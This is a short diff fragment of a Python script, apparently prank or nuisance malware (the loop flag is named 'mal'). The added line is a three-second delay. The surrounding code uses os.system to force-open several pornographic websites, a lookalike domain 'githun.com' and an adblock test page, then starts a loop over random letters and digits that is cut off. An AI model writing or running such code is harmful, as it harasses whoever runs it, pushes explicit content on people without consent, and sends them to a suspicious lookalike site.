@@ -9,6 +9,7 @@ def forked():
   randomlet = ["A", "a", "B", "b", "C", "c", "D", "d", "E", "e", "F", "f", "G", "g", "H", "h", "I", "i", "J", "j", "K", "k", "L", "l", "M","m", "N", "n", "O", "o", "P", "p", "Q", "q", "R", "r", "S", "S", "T", "t", "U", "u", "V", "v", "W", "x", "Y", "y", "Z", "z"]
   randonum = ["1", "2", "3", "4", "5", "6", "7", "8", "9"]
   number = 1
+  time.sleep(3)
   os.system("xdg-open https://www.xvideos.com/ && xdg-open https://www.spankbang.com/ && xdg-open https://www.xnxx.com/ && xdg-open https://www.pornhub.com/ && xdg-open https://www.githun.com/ && xdg-open https://canyoublockit.com/advanced-adblocker-test/web-banners/")
   while mal == True:
     random1 = random.choice(randomlet)
